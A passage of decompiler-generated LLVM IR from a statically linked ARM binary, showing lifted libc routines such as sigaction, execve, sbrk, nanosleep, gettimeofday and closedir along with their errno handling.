  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_29300 = load i32, i32* @r4, align 4
  store i32 %v3_29300, i32* %stack_var_-16, align 4
  %v3_2930c = urem i32 %arg4, 4096
  %v2_29310 = icmp eq i32 %v3_2930c, 0
  br i1 %v2_29310, label %dec_label_pc_29334, label %dec_label_pc_29318

dec_label_pc_29318:                               ; preds = %entry
  %v0_2931c = call i32 @__aeabi_read_tp()
  store i32 %v0_2931c, i32* %r0.global-to-local, align 4
  %v3_29320 = load i16, i16* @global_var_42934.3040, align 2
  %v4_29320 = sext i16 %v3_29320 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_2932c = add i32 %v4_29320, %v0_2931c
  %v4_2932c = inttoptr i32 %v3_2932c to i32*
  store i32 22, i32* %v4_2932c, align 4
  %v0_29368.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_29368

dec_label_pc_29334:                               ; preds = %entry
  %v0_29344 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_29344, -4095
  br i1 %tmp, label %dec_label_pc_29364, label %dec_label_pc_2934c

dec_label_pc_2934c:                               ; preds = %dec_label_pc_29334
  %v1_29350 = sub i32 0, %v0_29344
  %v3_29354 = load i16, i16* @global_var_42934.3040, align 2
  %v4_29354 = sext i16 %v3_29354 to i32
  %v0_29358 = call i32 @__aeabi_read_tp()
  %v3_2935c = add i32 %v4_29354, %v0_29358
  %v4_2935c = inttoptr i32 %v3_2935c to i32*
  store i32 %v1_29350, i32* %v4_2935c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_29364

dec_label_pc_29364:                               ; preds = %dec_label_pc_29334, %dec_label_pc_2934c
  %v0_29364 = phi i32 [ %v0_29344, %dec_label_pc_29334 ], [ -1, %dec_label_pc_2934c ]
  store i32 %v0_29364, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_29368

dec_label_pc_29368:                               ; preds = %dec_label_pc_29318, %dec_label_pc_29364
  %v0_29368 = phi i32 [ %v0_29368.pre, %dec_label_pc_29318 ], [ %v0_29364, %dec_label_pc_29364 ]
  store i32 %v0_29368, i32* %r0.global-to-local, align 4
  %v2_2936c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2936c, i32* @r4, align 4
  ret i32 %v0_29368

; uselistorder directives
  uselistorder i32 %v0_29368, { 1, 0 }
  uselistorder i32 %v0_29344, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_29368, { 1, 0 }
  uselistorder label %dec_label_pc_29364, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_2937c = load i32, i32* @lr, align 4
  store i32 %v0_2937c, i32* %stack_var_-4, align 4
  %v0_29384 = load i32, i32* @r0, align 4
  %v3_29388 = load i16, i16* @global_var_42934.3040, align 2
  %v4_29388 = sext i16 %v3_29388 to i32
  store i32 %v4_29388, i32* @r2, align 4
  %v0_2938c = call i32 @__aeabi_read_tp()
  %v1_29390 = sub i32 0, %v0_29384
  store i32 %v1_29390, i32* @r3, align 4
  %v2_29394 = load i32, i32* @r2, align 4
  %v3_29394 = add i32 %v2_29394, %v0_2938c
  %v4_29394 = inttoptr i32 %v3_29394 to i32*
  store i32 %v1_29390, i32* %v4_29394, align 4
  %v2_2939c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_2939c, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_293a8 = load i32, i32* @r4, align 4
  %v6_293a8 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_293b0 = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_293b0, label %dec_label_pc_29404, label %dec_label_pc_293c8

dec_label_pc_293c8:                               ; preds = %entry
  %v1_293c8 = add i32 %arg2, 4
  %v2_293c8 = inttoptr i32 %v1_293c8 to i32*
  %v3_293c8 = load i32, i32* %v2_293c8, align 4
  store i32 %v3_293c8, i32* @r3, align 4
  %v1_293cc = and i32 %v3_293c8, 67108864
  %v2_293cc = icmp eq i32 %v1_293cc, 0
  br i1 %v2_293cc, label %dec_label_pc_293d4, label %dec_label_pc_29404

dec_label_pc_293d4:                               ; preds = %dec_label_pc_293c8
  store i32 20, i32* @r2, align 4
  %v2_293d8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_293d8, i32* @r0, align 4
  %v0_293dc = call i32 @memcpy()
  %v0_29404.pre = load i32, i32* @r5, align 4
  %v0_2940c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_29404

dec_label_pc_29404:                               ; preds = %dec_label_pc_293c8, %entry, %dec_label_pc_293d4
  %v0_2940c = phi i32 [ %arg3, %dec_label_pc_293c8 ], [ %arg3, %entry ], [ %v0_2940c.pre, %dec_label_pc_293d4 ]
  %v0_29408 = phi i32 [ %arg2, %dec_label_pc_293c8 ], [ 0, %entry ], [ %v2_293d8, %dec_label_pc_293d4 ]
  %v0_29404 = phi i32 [ %arg1, %dec_label_pc_293c8 ], [ %arg1, %entry ], [ %v0_29404.pre, %dec_label_pc_293d4 ]
  %v4_29414 = call i32 @__syscall_rt_sigaction(i32 %v0_29404, i32 %v0_29408, i32 %v0_2940c, i32 8)
  store i32 %v3_293a8, i32* @r4, align 4
  store i32 %v6_293a8, i32* @r5, align 4
  ret i32 %v4_29414

; uselistorder directives
  uselistorder label %dec_label_pc_29404, { 2, 0, 1 }
}

define i32 @function_29428(i32 %arg1) local_unnamed_addr {
dec_label_pc_29428:
  %v0_29428 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29428, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_29428
  %v1_29428 = load i32, i32* @r4, align 4
  %v3_29428 = mul i32 %v1_29428, %arg1
  %v2_2942c = load i32, i32* @r8, align 4
  %v4_2942c = mul i32 %v2_2942c, 2
  %v5_2942c = and i32 %v4_2942c, %v3_29428
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_29428, %bb
  %v6_2942c = phi i32 [ %arg1, %dec_label_pc_29428 ], [ %v5_2942c, %bb ]
  ret i32 %v6_2942c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_29434 = call i32 @__sigsetjmp()
  ret i32 %v0_29434
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_2944c = load i32, i32* @r0, align 4
  ret i32 %v0_2944c
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_29460 = load i32, i32* @r7, align 4
  store i32 %v3_29460, i32* %stack_var_-8, align 4
  %v0_2946c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2946c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2946c, -4095
  br i1 %tmp, label %dec_label_pc_29494, label %dec_label_pc_2947c

dec_label_pc_2947c:                               ; preds = %entry
  %v0_29480 = call i32 @__aeabi_read_tp()
  %v3_29484 = load i16, i16* @global_var_42934.3040, align 2
  %v4_29484 = sext i16 %v3_29484 to i32
  %v0_29488 = load i32, i32* %r2.global-to-local, align 4
  %v1_29488 = sub i32 0, %v0_29488
  store i32 %v1_29488, i32* %r2.global-to-local, align 4
  %v3_2948c = add i32 %v4_29484, %v0_29480
  %v4_2948c = inttoptr i32 %v3_2948c to i32*
  store i32 %v1_29488, i32* %v4_2948c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_29494.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_29494

dec_label_pc_29494:                               ; preds = %entry, %dec_label_pc_2947c
  %v1_29498 = phi i32 [ %v0_2946c, %entry ], [ -1, %dec_label_pc_2947c ]
  %v2_29494 = phi i32 [ %v3_29460, %entry ], [ %v2_29494.pre, %dec_label_pc_2947c ]
  store i32 %v2_29494, i32* @r7, align 4
  ret i32 %v1_29498

; uselistorder directives
  uselistorder i32 %v0_2946c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_29494, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_294d4, label %dec_label_pc_294bc

dec_label_pc_294bc:                               ; preds = %entry
  %v0_294c0 = call i32 @__aeabi_read_tp()
  %v3_294c4 = load i16, i16* @global_var_42934.3040, align 2
  %v4_294c4 = sext i16 %v3_294c4 to i32
  %v0_294c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_294c8 = sub i32 0, %v0_294c8
  store i32 %v1_294c8, i32* %r2.global-to-local, align 4
  %v3_294cc = add i32 %v4_294c4, %v0_294c0
  %v4_294cc = inttoptr i32 %v3_294cc to i32*
  store i32 %v1_294c8, i32* %v4_294cc, align 4
  br label %dec_label_pc_294d4

dec_label_pc_294d4:                               ; preds = %entry, %dec_label_pc_294bc
  %v1_294d8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_294bc ]
  ret i32 %v1_294d8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_294d4, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_294f0 = load i32, i32* @r0, align 4
  ret i32 %v1_294f0
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_29504 = load i32, i32* @r0, align 4
  ret i32 %v1_29504
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_29514 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 164) to i32*), align 4
  %v1_29518 = inttoptr i32 %v4_29514 to i32*
  %v2_29518 = load i32, i32* %v1_29518, align 4
  %v2_2951c = icmp eq i32 %v2_29518, 0
  br i1 %v2_2951c, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_29524 = phi i32 [ %v2_29518, %entry ], [ 4096, %bb ]
  ret i32 %v1_29524

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_29530 = load i32, i32* @r7, align 4
  store i32 %v3_29530, i32* %stack_var_-8, align 4
  %v0_2953c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_2953c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_2953c, -4095
  br i1 %tmp, label %dec_label_pc_29564, label %dec_label_pc_2954c

dec_label_pc_2954c:                               ; preds = %entry
  %v0_29550 = call i32 @__aeabi_read_tp()
  %v3_29554 = load i16, i16* @global_var_42934.3040, align 2
  %v4_29554 = sext i16 %v3_29554 to i32
  %v0_29558 = load i32, i32* %r2.global-to-local, align 4
  %v1_29558 = sub i32 0, %v0_29558
  store i32 %v1_29558, i32* %r2.global-to-local, align 4
  %v3_2955c = add i32 %v4_29554, %v0_29550
  %v4_2955c = inttoptr i32 %v3_2955c to i32*
  store i32 %v1_29558, i32* %v4_2955c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_29564.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_29564

dec_label_pc_29564:                               ; preds = %entry, %dec_label_pc_2954c
  %v1_29568 = phi i32 [ %v0_2953c, %entry ], [ -1, %dec_label_pc_2954c ]
  %v2_29564 = phi i32 [ %v3_29530, %entry ], [ %v2_29564.pre, %dec_label_pc_2954c ]
  store i32 %v2_29564, i32* @r7, align 4
  ret i32 %v1_29568

; uselistorder directives
  uselistorder i32 %v0_2953c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_29564, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_29580 = load i32, i32* @r0, align 4
  ret i32 %v1_29580
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_29584 = load i32, i32* @r7, align 4
  store i32 %v3_29584, i32* %stack_var_-8, align 4
  %v0_29590 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_29590, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_29590, -4095
  br i1 %tmp, label %dec_label_pc_295b8, label %dec_label_pc_295a0

dec_label_pc_295a0:                               ; preds = %entry
  %v0_295a4 = call i32 @__aeabi_read_tp()
  %v3_295a8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_295a8 = sext i16 %v3_295a8 to i32
  %v0_295ac = load i32, i32* @r2, align 4
  %v1_295ac = sub i32 0, %v0_295ac
  store i32 %v1_295ac, i32* @r2, align 4
  %v3_295b0 = add i32 %v4_295a8, %v0_295a4
  %v4_295b0 = inttoptr i32 %v3_295b0 to i32*
  store i32 %v1_295ac, i32* %v4_295b0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_295b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_295b8

dec_label_pc_295b8:                               ; preds = %entry, %dec_label_pc_295a0
  %v1_295bc = phi i32 [ %v0_29590, %entry ], [ -1, %dec_label_pc_295a0 ]
  %v2_295b8 = phi i32 [ %v3_29584, %entry ], [ %v2_295b8.pre, %dec_label_pc_295a0 ]
  store i32 %v2_295b8, i32* @r7, align 4
  ret i32 %v1_295bc

; uselistorder directives
  uselistorder i32 %v0_29590, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_295b8, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_295c4 = load i32, i32* @r7, align 4
  store i32 %v3_295c4, i32* %stack_var_-8, align 4
  %v0_295d0 = load i32, i32* @r0, align 4
  store i32 %v0_295d0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_295d0, -4095
  br i1 %tmp, label %dec_label_pc_295f8, label %dec_label_pc_295e0

dec_label_pc_295e0:                               ; preds = %entry
  %v0_295e4 = call i32 @__aeabi_read_tp()
  %v3_295e8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_295e8 = sext i16 %v3_295e8 to i32
  %v0_295ec = load i32, i32* %r2.global-to-local, align 4
  %v1_295ec = sub i32 0, %v0_295ec
  store i32 %v1_295ec, i32* %r2.global-to-local, align 4
  %v3_295f0 = add i32 %v4_295e8, %v0_295e4
  %v4_295f0 = inttoptr i32 %v3_295f0 to i32*
  store i32 %v1_295ec, i32* %v4_295f0, align 4
  %v2_295f8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_295f8

dec_label_pc_295f8:                               ; preds = %entry, %dec_label_pc_295e0
  %v1_295fc = phi i32 [ %v0_295d0, %entry ], [ -1, %dec_label_pc_295e0 ]
  %v2_295f8 = phi i32 [ %v3_295c4, %entry ], [ %v2_295f8.pre, %dec_label_pc_295e0 ]
  store i32 %v2_295f8, i32* @r7, align 4
  ret i32 %v1_295fc

; uselistorder directives
  uselistorder i32 %v0_295d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_295f8, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_29610 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_29614 = icmp eq i32 %v4_29610, 0
  %v3_29618 = load i32, i32* @r4, align 4
  %v9_29618 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_29614, label %dec_label_pc_29628, label %entry.dec_label_pc_29630_crit_edge

entry.dec_label_pc_29630_crit_edge:               ; preds = %entry
  br label %dec_label_pc_29630

dec_label_pc_29628:                               ; preds = %entry
  store i32 %v3_29618, i32* @r4, align 4
  store i32 %v9_29618, i32* @r6, align 4
  %v0_2962c = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_29630

dec_label_pc_29630:                               ; preds = %entry.dec_label_pc_29630_crit_edge, %dec_label_pc_29628
  %v0_29630 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_29630, i32* @r5, align 4
  %v0_2963c = load i32, i32* @r4, align 4
  store i32 %v0_2963c, i32* @r0, align 4
  %v0_29640 = call i32 @__syscall_nanosleep()
  store i32 %v0_29640, i32* @r4, align 4
  %v0_29648 = load i32, i32* @r5, align 4
  %v1_2964c = call i32 @__libc_disable_asynccancel(i32 %v0_29648)
  %v0_29650 = load i32, i32* @r4, align 4
  ret i32 %v0_29650

; uselistorder directives
  uselistorder label %dec_label_pc_29630, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_29664 = load i32, i32* @r4, align 4
  store i32 %v3_29664, i32* %stack_var_-16, align 4
  store i32 28812, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r4.global-to-local, align 4
  %v4_29674 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 28812) to i32*), align 4
  %v2_29678 = icmp eq i32 %v4_29674, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_29678, label %dec_label_pc_29684, label %dec_label_pc_29694

dec_label_pc_29684:                               ; preds = %entry
  %v1_29688 = call i32 @__GI_brk(i32 0)
  %v1_2968c = icmp slt i32 %v1_29688, 0
  br i1 %v1_2968c, label %dec_label_pc_296b8, label %dec_label_pc_29694thread-pre-split

dec_label_pc_29694thread-pre-split:               ; preds = %dec_label_pc_29684
  %v0_29698.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_29694.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_29694.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_29694

dec_label_pc_29694:                               ; preds = %dec_label_pc_29694thread-pre-split, %entry
  %v1_29694 = phi i32 [ %v1_29694.pre, %dec_label_pc_29694thread-pre-split ], [ 28812, %entry ]
  %v0_29694 = phi i32 [ %v0_29694.pre, %dec_label_pc_29694thread-pre-split ], [ ptrtoint (i32* @global_var_428d0.3044 to i32), %entry ]
  %v1_296a8 = phi i32 [ %v0_29698.pr, %dec_label_pc_29694thread-pre-split ], [ %arg1, %entry ]
  %v2_29694 = add i32 %v0_29694, %v1_29694
  %v3_29694 = inttoptr i32 %v2_29694 to i32*
  %v4_29694 = load i32, i32* %v3_29694, align 4
  %v2_29698 = icmp eq i32 %v1_296a8, 0
  store i32 %v4_29694, i32* %r4.global-to-local, align 4
  br i1 %v2_29698, label %dec_label_pc_296bc, label %dec_label_pc_296a4

dec_label_pc_296a4:                               ; preds = %dec_label_pc_29694
  %v2_296a8 = add i32 %v4_29694, %v1_296a8
  %v1_296ac = call i32 @__GI_brk(i32 %v2_296a8)
  %v1_296b0 = icmp slt i32 %v1_296ac, 0
  br i1 %v1_296b0, label %dec_label_pc_296b8, label %dec_label_pc_296a4.dec_label_pc_296bc_crit_edge

dec_label_pc_296a4.dec_label_pc_296bc_crit_edge:  ; preds = %dec_label_pc_296a4
  %v0_296bc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_296bc

dec_label_pc_296b8:                               ; preds = %dec_label_pc_296a4, %dec_label_pc_29684
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_296bc

dec_label_pc_296bc:                               ; preds = %dec_label_pc_29694, %dec_label_pc_296a4.dec_label_pc_296bc_crit_edge, %dec_label_pc_296b8
  %v0_296bc = phi i32 [ %v0_296bc.pre, %dec_label_pc_296a4.dec_label_pc_296bc_crit_edge ], [ -1, %dec_label_pc_296b8 ], [ %v4_29694, %dec_label_pc_29694 ]
  %v2_296c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_296c0, i32* @r4, align 4
  ret i32 %v0_296bc

; uselistorder directives
  uselistorder i32 %v4_29694, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_296bc, { 2, 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_296fc, label %dec_label_pc_296e4

dec_label_pc_296e4:                               ; preds = %entry
  %v1_296e8 = sub i32 0, %arg1
  %v3_296ec = load i16, i16* @global_var_42934.3040, align 2
  %v4_296ec = sext i16 %v3_296ec to i32
  %v0_296f0 = call i32 @__aeabi_read_tp()
  %v3_296f4 = add i32 %v4_296ec, %v0_296f0
  %v4_296f4 = inttoptr i32 %v3_296f4 to i32*
  store i32 %v1_296e8, i32* %v4_296f4, align 4
  br label %dec_label_pc_296fc

dec_label_pc_296fc:                               ; preds = %entry, %dec_label_pc_296e4
  %v1_29700 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_296e4 ]
  ret i32 %v1_29700

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_296fc, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_2970c = load i32, i32* %arg1, align 4
  store i32 %v2_2970c, i32* %r3.global-to-local, align 4
  %v3_29714 = icmp eq i32 %v2_2970c, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r6, align 4
  br i1 %v3_29714, label %dec_label_pc_29728, label %dec_label_pc_29744

dec_label_pc_29728:                               ; preds = %entry
  store i32 102908, i32* %r2.global-to-local, align 4
  %v0_2972c = call i32 @__aeabi_read_tp()
  %v3_29730 = load i16, i16* @global_var_42934.3040, align 2
  %v4_29730 = sext i16 %v3_29730 to i32
  store i32 %v4_29730, i32* %r2.global-to-local, align 4
  %v0_29734 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_29734, i32* %r1.global-to-local, align 4
  %v1_29738 = add i32 %v0_29734, 10
  store i32 %v1_29738, i32* %r3.global-to-local, align 4
  %v3_2973c = add i32 %v4_29730, %v0_2972c
  %v4_2973c = inttoptr i32 %v3_2973c to i32*
  store i32 %v1_29738, i32* %v4_2973c, align 4
  %v0_297ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_297ec

dec_label_pc_29744:                               ; preds = %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_29748 = add i32 %tmp, 24
  store i32 %v1_29748, i32* %r2.global-to-local, align 4
  %v4_29750 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 76) to i32*), align 4
  store i32 %v4_29750, i32* %r1.global-to-local, align 4
  store i32 124, i32* %r3.global-to-local, align 4
  %v4_2975c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_2975c)
  store i32 -1, i32* @r8, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_29774 = load i32, i32* @r6, align 4
  %v2_29774 = add i32 %v0_29774, 20
  %v3_29774 = inttoptr i32 %v2_29774 to i32*
  %v4_29774 = load i32, i32* %v3_29774, align 4
  call void @__pseudo_branch(i32 %v4_29774)
  %v0_29780 = load i32, i32* @r7, align 4
  %v1_29780 = inttoptr i32 %v0_29780 to i32*
  %v2_29780 = load i32, i32* %v1_29780, align 4
  store i32 %v2_29780, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v0_29790 = load i32, i32* @r8, align 4
  store i32 %v0_29790, i32* %v1_29780, align 4
  %v0_29794 = load i32, i32* @r6, align 4
  %v1_29794 = load i32, i32* %r3.global-to-local, align 4
  %v2_29794 = add i32 %v1_29794, %v0_29794
  %v3_29794 = inttoptr i32 %v2_29794 to i32*
  %v4_29794 = load i32, i32* %v3_29794, align 4
  store i32 ptrtoint (i32* @global_var_297a0.3397 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_29794)
  %v0_297a0 = load i32, i32* @r7, align 4
  %v1_297a0 = add i32 %v0_297a0, 12
  %v2_297a0 = inttoptr i32 %v1_297a0 to i32*
  %v3_297a0 = load i32, i32* %v2_297a0, align 4
  store i32 %v3_297a0, i32* @r0, align 4
  %v0_297a4 = call i32 @free()
  %v0_297a8 = load i32, i32* @r7, align 4
  store i32 %v0_297a8, i32* @r0, align 4
  %v0_297ac = call i32 @free()
  %v0_297b4 = load i32, i32* @r4, align 4
  store i32 %v0_297b4, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_297b4, -4095
  br i1 %tmp11, label %dec_label_pc_297e8, label %dec_label_pc_297d0

dec_label_pc_297d0:                               ; preds = %dec_label_pc_29744
  store i32 102740, i32* %r3.global-to-local, align 4
  %v0_297d4 = call i32 @__aeabi_read_tp()
  %v3_297d8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_297d8 = sext i16 %v3_297d8 to i32
  store i32 %v4_297d8, i32* %r3.global-to-local, align 4
  %v0_297dc = load i32, i32* %r2.global-to-local, align 4
  %v1_297dc = sub i32 0, %v0_297dc
  store i32 %v1_297dc, i32* %r2.global-to-local, align 4
  %v3_297e0 = add i32 %v4_297d8, %v0_297d4
  %v4_297e0 = inttoptr i32 %v3_297e0 to i32*
  store i32 %v1_297dc, i32* %v4_297e0, align 4
  %v0_297e4 = load i32, i32* @r8, align 4
  br label %dec_label_pc_297e8

dec_label_pc_297e8:                               ; preds = %dec_label_pc_29744, %dec_label_pc_297d0
  %v0_297e8 = phi i32 [ %v0_297b4, %dec_label_pc_29744 ], [ %v0_297e4, %dec_label_pc_297d0 ]
  store i32 %v0_297e8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_297ec

dec_label_pc_297ec:                               ; preds = %dec_label_pc_29728, %dec_label_pc_297e8
  %v0_297ec = phi i32 [ %v0_297ec.pre, %dec_label_pc_29728 ], [ %v0_297e8, %dec_label_pc_297e8 ]
  ret i32 %v0_297ec

; uselistorder directives
  uselistorder i32 %v0_297b4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_297ec, { 1, 0 }
  uselistorder label %dec_label_pc_297e8, { 1, 0 }
}

define i32 @function_29804(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_29804:
  %v0_29804 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_29804, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_29804
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_29804, %bb
  %v10_29814 = phi i32 [ %arg1, %dec_label_pc_29804 ], [ 0, %bb ]
  ret i32 %v10_29814

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_29818 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_2982c = call i32 @malloc(i32 48)
  %v2_29834 = icmp eq i32 %v1_2982c, 0
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r6, align 4
  br i1 %v2_29834, label %bb, label %dec_label_pc_29844

bb:                                               ; preds = %entry
  br label %dec_label_pc_298d0

dec_label_pc_29844:                               ; preds = %entry
